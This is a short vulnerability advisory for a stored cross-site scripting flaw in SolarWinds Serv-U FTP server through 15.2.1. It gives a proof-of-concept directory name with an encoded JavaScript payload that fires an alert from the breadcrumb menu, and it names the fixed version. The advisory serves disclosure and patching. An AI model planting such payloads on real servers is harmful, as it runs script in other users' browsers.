1. Vulnerability Description

 

SolarWinds Serv-U FTP server through 15.2.1 does not correctly sanitize and validate the user-supplied directory names, allowing malicious users to create directories that when clicked on (in the breadcrumb menu) will trigger XSS payloads.

 

2. PoC

 

On a vulnerable Serv-U FTP server installation, create a directory named as such:

 

%27%29%3Ba%3Dfunction%28b%29%20%7B%20alert%28%22XSS%22%29%3B%20%7D%3Ba%28%27

 

The payload contains ');a=function(b) { alert("XSS"); };a('

 

As soon as a user clicks on the directory name in the breadcrumb menu, it will trigger the stored XSS.

 

3. Solution

 

The vendor provides an updated version (15.2.2) which should be installed immediately.
